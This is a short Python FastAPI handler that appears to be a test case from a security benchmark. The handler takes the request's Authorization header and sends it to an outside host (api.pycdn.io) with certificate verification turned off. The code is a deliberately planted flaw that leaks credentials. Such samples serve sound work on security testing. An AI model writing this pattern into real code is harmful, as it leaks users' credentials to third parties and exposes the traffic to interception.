# SPDX-License-Identifier: Apache-2.0
from fastapi import Request
import requests


async def BenchmarkTest03263(request: Request):
    auth_header = request.headers.get('authorization', '')
    requests.get('https://api.pycdn.io/data', params={'q': str(auth_header)}, verify=False)
    return {"updated": True}
